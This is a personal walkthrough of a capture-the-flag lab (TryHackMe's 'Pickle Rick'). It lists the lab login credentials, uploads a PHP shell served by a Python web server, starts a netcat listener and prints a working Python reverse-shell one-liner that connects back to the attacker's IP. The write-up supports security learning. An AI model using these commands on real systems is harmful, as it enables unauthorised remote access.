


access to /login.php with

user: R1ckRul3s
pass: Wubbalubbadubdub

![[Pasted image 20221029121458.png]]

very straightforward code execution:

![[Pasted image 20221029121544.png]]

![[Pasted image 20221029122156.png]]


tried:

cat Sup3rS3cretPickl3Ingred.txt

`

![[Pasted image 20221029121719.png]]

so I tried with strings:


![[Pasted image 20221029122351.png]]

spawn a Python web server:
```
joshua@kaligra:~/Documents/thm/Pickle Rick/Walkthrough$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

![[Pasted image 20221029122006.png]]


Ok, file is transferred to target:

```
10.10.104.194 - - [29/Oct/2022 12:19:31] "GET /shell.php HTTP/1.1" 200 -

```



Let's spawn a netcat listener:

```
joshua@kaligra:~/Documents/thm/Pickle Rick/Walkthrough$ nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444

```

it seems we have not permission (as 
`www-data`

Bash reverse shell failed, so I tried with python

```
export RHOST="10.9.10.198";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

got access

```
joshua@kaligra:~/Documents/thm/Pickle Rick/Walkthrough$ nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.104.194.
Ncat: Connection from 10.10.104.194:38872.
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$

```


